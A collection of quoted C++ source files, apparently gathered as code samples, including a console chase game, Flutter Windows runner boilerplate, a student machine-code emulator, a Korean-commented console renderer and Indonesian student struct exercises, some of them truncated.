    "//\n// Created by SeparateWings on 9/28/23.\n//\n\n#include \"run.h\"\n#include \"utils.h\"\n\nnamespace key_bot_game {\n    bool Run::run() {\n        // welcome\n        std::cout << \"Welcome to KeyBotGame!\" << std::endl;\n        std::cout << \"Please input the player type (0 for walk, 1 for car): \";\n        int playerType;\n        std::cin >> playerType;\n        if (playerType != 0 && playerType != 1) {\n            std::cout << \"Wrong input! Try again!\" << std::endl;\n            return false;\n        }\n        std::cout << \"Type wasd to move and q to exit the game, others to wait\" << std::endl;\n        std::cout << \"Enter to start...\" << std::endl;\n        std::cin.get();\n\n        // init map\n        auto playerPosition = Utils::getRandomPosition(MAP_SIZE);\n        auto thiefPosition = Utils::getRandomPosition(MAP_SIZE);\n        auto exitPosition = Utils::getRandomPosition(MAP_SIZE);\n        pMap = std::make_unique<Map>(playerPosition, PlayerType(playerType), thiefPosition, exitPosition);\n        pMap->drawMap();\n\n        // game loop\n        while (true) {\n            int key = Utils::scanKeyboard();\n            // exit the game\n            if (key == 'q') {\n                std::cout << std::endl;\n                std::cout << \"Game exit.\" << std::endl;\n                return true;\n            }\n\n            // move the player\n            pMap->playerMove(Utils::getMoveDirection(key));\n\n            // check if win\n            if (checkWin()) {\n                return true;\n            }\n\n            // move the thief\n            pMap->thiefMove();\n\n            // check if lose\n            if (checkLose()) {\n                return true;\n            }\n\n            // \u3082\u3046\u4e00\u5ea6 check if win\n            if (checkWin()) {\n                return true;\n            }\n\n        }\n    }\n\n    bool Run::checkWin() {\n        pMap->drawMap();\n        if (pMap->ifWin()) {\n            std::cout << std::endl;\n            std::cout << \"You catch the thief!\" << std::endl;\n            return true;\n        }\n        return false;\n    }\n\n    bool Run::checkLose() {\n        pMap->drawMap();\n        if (pMap->ifLose()) {\n            std::cout << std::endl;\n            std::cout << \"Thief has escaped!\" << std::endl;\n            return true;\n        }\n        return false;\n    }\n} // key_bot_game",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// TITLE: emulator.cpp\n// AUTHOR: Sahil Agrawal(2101CS69)\n// Declaration of Authorship\n// This file is part of the assignment of CS209 at the\n// department of Computer Science and Engineering, IIT Patna. \n\n#include <bits/stdc++.h>\nusing namespace std;\n#define endl \"\\n\"\n\nint mainMemory[1 << 24];\nint total = 0;\nstring file_name;\nfstream _file;\nint limiting_factor = 100000;\nint SL = 1 << 23;\nint PC = 0, SP = 0, RegisterA = 0, registerB = 0;\nvector<int> OF;\nvector<string> mnemonics={\"ldc\", \"adc\", \"ldl\", \"stl\", \"ldnl\", \"stnl\", \"add\", \"sub\", \"shl\", \"shr\", \"adj\", \"a2sp\", \"sp2a\", \"call\", \"return\", \"brz\", \"brlz\", \"br\", \"HALT\"};\n\nstring converting_to_hex_again(int value, int len)\n{\n    stringstream object;\n    object << hex << value;\n    string r(object.str());\n    reverse(r.begin(), r.end());\n    while ((int)r.size() > len)\n    {\n        r.pop_back();\n    }\n    while ((int)r.size() < len)\n    {\n        r.push_back('0');\n    }\n    reverse(r.begin(), r.end());\n    return r;\n}\n\n\n\nvoid executeOpcode(int opc, int Value)\n{\n    if(opc==0)\n    {\n        registerB = RegisterA;\n        RegisterA = Value;\n\n    }\n    if(opc==1)\n    {\n        RegisterA += Value;\n\n    }\n    if(opc==2)\n    {\n        registerB = RegisterA;\n        RegisterA = mainMemory[SP + Value];\n\n    }\n    if(opc==3)\n    {\n        mainMemory[SP + Value] = RegisterA;\n        RegisterA = registerB;\n\n    }\n    if(opc==4)\n    {\n       RegisterA = mainMemory[RegisterA + Value];\n\n    }\n   \n    if(opc==5)\n    {\n       mainMemory[RegisterA + Value] = registerB;  \n    }\n    if(opc==6)\n    {\n      RegisterA = registerB + RegisterA;  \n    }\n    if(opc==7)\n    {\n       RegisterA = registerB - RegisterA; \n    }\n     if(opc==8)\n    {\n       RegisterA = registerB << RegisterA; \n    }\n    if(opc==9)\n    {\n       RegisterA = registerB >> RegisterA;\n    }\n     if(opc==10)\n    {\n       SP = SP + Value;\n    }\n     if(opc==11)\n    {SP = RegisterA;\n        RegisterA = registerB;\n    }\n     if(opc==12)\n    {\n        registerB = RegisterA;\n        RegisterA = SP;\n    }\n     if(opc==13)\n    {\n       registerB = RegisterA;\n        RegisterA = PC;\n        PC = Value +PC;\n    }\n     if(opc==14)\n    {\n      PC = RegisterA;\n        RegisterA = registerB;\n    }\n     if(opc==15)\n    {\n       if (RegisterA == 0)\n        {\n            PC = PC + Value;\n        }\n    }\n     if(opc==16)\n    {\n      if (RegisterA < 0)\n        {\n            PC = PC + Value;\n        }\n    }\n     if(opc==17)\n    {\n       PC = PC + Value;\n    }\n     if(opc==18)\n    {\n      printf(\"A = %08X, B = %08X, PC = %08X, SP = %08X\\n\", RegisterA, registerB, PC, SP);\n    _file << \"A = \" << converting_to_hex_again(RegisterA, 8) << \", B = \" << converting_to_hex_again(registerB, 8) << \", PC = \" << converting_to_hex_again(PC, 8) << \", SP = \" << converting_to_hex_again(SP, 8) << endl;\n                \n                 cout << \"Number of instructions passed: \" << total << endl;\n                 exit(0);\n    }\n    if(opc>18)\n    {\n       cout << \"Invalid opcode.Please input correct machine codes!.\"; \n        exit(0);\n    }\n   \n    }\n\n\nint ArgRun()\n{\n    // if (PC >= (int)OF.size())\n    // {\n    //     cout << \"Segmentation fault!\";\n    //     exit(0);\n    // }\n\n    int opc = 0xFF & OF[PC]; // last 8 bits\n    int Value = OF[PC] >> 8;  // first 24 bits\n\n    if (opc == 18) // HALT\n    {\n        total++;\n        return 0;\n    }\n\n    cout << mnemonics[opc] << \"\\t\";\n    printf(\"%08X\\n\", Value);\n\n    executeOpcode(opc, Value);\n\n    printf(\"A = %08X, B = %08X, PC = %08X, SP = %08X\\n\", RegisterA, registerB, PC, SP);\n    _file << \"A = \" << converting_to_hex_again(RegisterA, 8) << \", B = \" << converting_to_hex_again(registerB, 8) << \", PC = \" << converting_to_hex_again(PC, 8) << \", SP = \" << converting_to_hex_again(SP, 8) << endl;\n\n    total++;\n    PC++;\n\n    if (total > limiting_factor)\n    {\n        cout << \"Infinite loop detected!\";\n        exit(0);\n    }\n\n    if (SP > SL)\n    {\n        cout << \"Stack overflow!\";\n        exit(0);\n    }\n\n    return 1;\n}\n\npair<long long, bool> read_operand(string &operand)\n{\n    int len = (int)operand.size();\n\n    if (len == 0)\n    {\n        return {0, 0};\n    }\n\n    char *str = (char *)malloc(len * sizeof(char));\n\n    for (int i = 0; i < len; i++)\n    {\n        str[i] = operand[i];\n    }\n    for (int i = len; i < strlen(str); i++)\n    {\n        str[i] = '\\0';\n    }\n\n    char *end;\n    long long num;\n\n    num = strtol(str, &end, 10); // conversion from decimal to decimal\n    if (!*end)\n    {\n        return {num, 1};\n    }\n\n    num = strtol(str, &end, 16); // conversion from hexadecimal to decimal\n    if (!*end)\n    {\n        return {num, 1};\n    }\n\n    return {-1, 0};\n}\n\nint function1()\n{\n    cout << \"Please input in Emulator input: \";\n    string hola;\n    cin >> hola;\n\n    for (int i = 0; i < hola.size(); i++)\n        hola[i] = tolower(hola[i]);\n\n    if (hola == \"-t\")\n    {\n        if (ArgRun() == 0)\n            cout << \"HALTing instructions!.\\n\";\n    }\n    else if (hola == \"-all\")\n    {\n        if (ArgRun() == 0",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sqflite_todo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ConsoleRenderer.h\"\n#include <stdio.h>\n\n\n/*\n\n    Windows 11 22H2\uc5d0\uc11c\ub294 \ucf58\uc194 \ucc3d\uc744 \ud638\uc2a4\ud2b8\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \uae30\ubcf8 \uc571\uc774 Windows \ud130\ubbf8\ub110 \ubcc0\uacbd\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\n    * \uba87\uba87 \ucf58\uc194\ucc3d \uad00\ub828 \ud568\uc218\uac00 \uc791\ub3d9\uc548\ud568.\n    https://support.microsoft.com/ko-kr/windows/windows-11-%EB%8C%80%ED%95%9C-%EB%AA%85%EB%A0%B9-%ED%94%84%EB%A1%AC%ED%94%84%ED%8A%B8-%EB%B0%8F-windows-powershell-6453ce98-da91-476f-8651-5c14d5777c20\n*/\nnamespace ConsoleRenderer\n{\n    HANDLE hConsoleHandle;      // \ucd08\uae30 \ud654\uba74 \ucf58\uc194\uc758 \ud578\ub4e4\n\n    int nScreenWidth = 0; // \ucf58\uc194\ucc3d\uc758 \ub108\ube44\n    int nScreenHeight = 0; // \ucf58\uc194\ucc3d\uc758 \ub192\uc774\n    int nScreenBufferSize = 0; // \ucf58\uc194\ucc3d\uc758 \uc2a4\ud06c\ub9b0\ubc84\ud37c \ud06c\uae30\n    int nScreenBufferIndex = 0; // \ucf58\uc194\ucc3d\uc774 \uc0ac\uc6a9\ud560 \uc2a4\ud06c\ub9b0\ubc84\ud37c\uc758 \uc778\ub371\uc2a4\n    HANDLE hScreenBuffer[2];\n\n    HANDLE GetCurrentScreenBufferHandle()\n    {\n        return hScreenBuffer[nScreenBufferIndex];\n    }\n\n    void ScreenInit()\n    {\n        // \ud604\uc7ac \ud654\uba74\ud06c\uae30\uc5d0 \ub9de\ub294 \ud654\uba74 \ucf58\uc194\uc2a4\ud06c\ub9b0\ubc84\ud37c 2\uac1c\ub97c \ub9cc\ub4e0\ub2e4.    \n        hConsoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);\n        hScreenBuffer[0] = CreateConsoleScreenBuffer(GENERIC_READ | GENERIC_WRITE, 0, NULL, CONSOLE_TEXTMODE_BUFFER, NULL);\n        hScreenBuffer[1] = CreateConsoleScreenBuffer(GENERIC_READ | GENERIC_WRITE, 0, NULL, CONSOLE_TEXTMODE_BUFFER, NULL);\n\n        // \uae30\ubcf8 \ucf58\uc194,\uc0dd\uc131\ub41c \ucf58\uc194\uc2a4\ud06c\ub9b0 \ubaa8\ub450 \ucee4\uc11c \uc548\ubcf4\uc774\uac8c \uc124\uc815\n        CONSOLE_CURSOR_INFO cursorInfo = { 0, };\n        cursorInfo.bVisible = FALSE;\n        cursorInfo.dwSize = 1; // \ucee4\uc11c\uc758 \ud06c\uae30\ub97c \uacb0\uc815 (1~100 \uc0ac\uc774\ub9cc \uac00\ub2a5)\n        SetConsoleCursorInfo(hConsoleHandle, &cursorInfo);\n        SetConsoleCursorInfo(hScreenBuffer[0], &cursorInfo);\n        SetConsoleCursorInfo(hScreenBuffer[1], &cursorInfo);\n\n        //\uae30\ubcf8 \ucf58\uc194\uc758 \ud654\uba74 \ud06c\uae30 \uc815\ubcf4\ub97c \uc5bb\ub294\ub2e4.\n        CONSOLE_SCREEN_BUFFER_INFO Info; // \ucd08\uae30 \ud654\uba74 \ucf58\uc194\uc758 \ud654\uba74 \uc815\ubcf4\n        GetConsoleScreenBufferInfo(hConsoleHandle, &Info);\n\n        nScreenHeight = Info.srWindow.Bottom - Info.srWindow.Top + 1;\n        nScreenWidth = Info.srWindow.Right - Info.srWindow.Left + 1;\n        nScreenBufferSize = nScreenWidth * nScreenHeight;\n    }\n\n    void ScreenFlipping()\n    {\n        // \uc2e4\uc81c \ucf58\uc194\uc774 \uc0ac\uc6a9\ud560 \uc2a4\ud06c\ub9b0\ubc84\ud37c\uc758 Handle\uc744 \uc124\uc815\ud558\uc5ec \ud654\uba74\uc5d0 \ubcf4\uc5ec\uc900\ub2e4.\n        SetConsoleActiveScreenBuffer(GetCurrentScreenBufferHandle());\n        // \ub2e4\uc74c\uc5d0 \uc0ac\uc6a9\ud560 \uc2a4\ud06c\ub9b0 \ubc84\ud37c\uc758 \uc778\ub371\uc2a4\ub97c \uc99d\uac00\uc2dc\ucf1c \uc900\ube44\ud55c\ub2e4.\n        nScreenBufferIndex++;\n        nScreenBufferIndex = nScreenBufferIndex % 2;  // 0,1,0,1,0,1,0,1....\n    }\n\n    void ScreenClear()\n    {\n        COORD Coor = { 0, 0 };\n        DWORD dw;\n        FillConsoleOutputCharacter(GetCurrentScreenBufferHandle(), ' ', nScreenBufferSize, Coor, &dw);\n    }\n\n    void ScreenRelease()\n    {\n        CloseHandle(hScreenBuffer[0]);\n        CloseHandle(hScreenBuffer[1]);\n    }\n\n\n\n\n    /*\n        FOREGROUND_BLUE\t\ud14d\uc2a4\ud2b8 \uc0c9\uc5d0 \ud30c\ub780\uc0c9\uc774 \ud3ec\ud568\ub429\ub2c8\ub2e4.\n        COMMON_LVB_LEADING_BYTE\t\uc120\ud589 \ubc14\uc774\ud2b8\uc785\ub2c8\ub2e4.\n\n        https://learn.microsoft.com/ko-kr/windows/console/console-screen-buffers#character-attributes\n    */\n\n\n    bool ScreenSetChar(int x, int y, char ch, WORD attr)\n    {\n        COORD\tcdPos;\n        BOOL\tbRval = FALSE;\n        DWORD\tdwCharsWritten;\n        cdPos.X = x;\n        cdPos.Y = y;\n\n        bRval = FillConsoleOutputCharacter(GetCurrentScreenBufferHandle(), ch, 1, cdPos, &dwCharsWritten);\n        if (bRval == false) printf(\"Error, FillConsoleOutputCharacter()\\n\");\n\n        bRval = FillConsoleOutputAttribute(GetCurrentScreenBufferHandle(), attr, 1, cdPos, &dwCharsWritten);\n        if (bRval == false) printf(\"Error, FillConsoleOutputAttribute()\\n\");\n        return bRval;\n    }\n\n    bool ScreenSetString(int x, int y, const char* pStr, WORD attr)\n    {\n        COORD\tcdPos;\n        BOOL\tbRval = FALSE;\n        DWORD\tdwCharsWritten;\n        cdPos.X = x;\n        cdPos.Y = y;\n\n        DWORD nNumberOfBytesToWrite = (DWORD)strlen(pStr);\n\n        SetConsoleCursorPosition(GetCurrentScreenBufferHandle(), cdPos);\n        WriteFile(GetCurrentScreenBufferHandle(), pStr, nNumberOfBytesToWrite, &dwCharsWritten, NULL);\n\n        bRval = FillConsoleOutputAttribute(GetCurrentScreenBufferHandle(), attr, nNumberOfBytesToWrite, cdPos, &dwCharsWritten);\n        if (bRval == false) printf(\"Error, FillConsoleOutputAttribute()\\n\");\n        return bRval;\n    }\n\n    bool ScreenSetAttr(WORD attr)\n    {\n        COORD\tcdPos;\n        bool\tbRval = FALSE;\n        DWORD\tdwCharsWritten;\n        //\tint x,y;\t\n\n        cdPos.X = 0;\n        cdPos.Y = 0;\n        bRval = FillConsoleOutputAttribute(GetCurrentScreenBufferHandle(), attr, nScreenBufferSize, cdPos, &dwCharsWritten);\n        if (bRval == false)\n        {\n            printf(\"Error, FillConsoleOutputCharacter()\\n\");\n            return bRval;\n        }\n\n        return bRval;\n    }\n\n\n    int ScreenWidth()\n    {\n        return nScreenWidth;\n    }\n    int ScreenHeight()\n    {\n        return nScreenHeight;\n    }\n};\n\n\n\n",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat {\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tstring umur;\n};\n\nint main() {\n\tMahasiswa mhs[3];\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << \"Data ke- \" << (i + 1) << \":\" << endl;\n\t\tcout << \"Nomor Mahasiswa : \";\n\t\tcin >> mhs[i].nim;\n\t\tcout << \"Nama Mahasiswa : \";\n\t\tcin >> mhs[i].nama;\n\n\t\tcout << \"Alamat Mahasiswa : \" << endl;\n\t\tcout << \"\\t Nama Desa : \";\n\t\tcin >> mhs[i].alamat.desa;\n\t\tcout << \"\\t Nama Kota : \";\n\t\tcin >> mhs[i].alamat.kota;\n\t\tcout << \"Umur Mahasiswa : \";\n\t\tcin >> mhs[i].umur;\n\t\tcin.ignore(1, '\\n');\n\t\tcout << endl;\n\t}\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << endl;\n\t\tcout << \"Data Mahasiswa ke- \" << (i + 1) << \":\" << endl;\n\t\tcout << \"\\n NIM : \" << mhs[i].nim;\n\t\tcout << \"\\n Nama : \" << mhs[i].nama;\n\t\tcout << \"\\n Alamat : \";\n\t\tcout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n\t\tcout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n\t\tcout << \"\\n Umur : \" << mhs[i].umur;\n\t\tcout << endl;\n\t}\n\n\n\t\n}",
    "#include <iostream>\nusing namespace std;\n\nstruct Mahasiswa //struct mahasiswa untuk mengambil input data mahasiswa\n{\n    string nim;\n    string nama;\n    string alamat;\n    int umur;\n};\n\nint main()\n{\n    Mahasiswa mhs; //inisialisasi variabel mhs untuk mengakses struck mahasiswa\n    cout << \"NIM Mahasiswa : \";\n    cin >> mhs.nim; //membuat display untuk mengambil data nim mahasiswa\n    cout << \"Nama Mahasiswa : \";\n    cin >> mhs.nama; //membuat display untuk mengambil data nama mahasiswa\n    cout << \"Alamat Mahasiswa : \";\n    cin >> mhs.alamat; //membuat display untuk mengambil data alamat mahasiswa\n    cout << \"Umur Mahasiswa : \";\n    cin >> mhs.umur; //membuat display untuk mengambil data umur mahasiswa\n\n    cout << endl;\n    cout << \"\\nNIM    : \" << mhs.nim; //membuat display dari data nim mahasiswa yang telah di inputkan\n    cout << \"\\nNama   : \" << mhs.nama; //membuat display dari data nama mahasiswa yang telah di inputkan\n    cout << \"\\nAlamat : \" << mhs.alamat; //membuat display dari data alamat mahasiswa yang telah di inputkan\n    cout << \"\\nUmur   : \" << mhs.umur; //membuat display dari data umur mahasiswa yang telah di inputkan\n\n}\n    ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    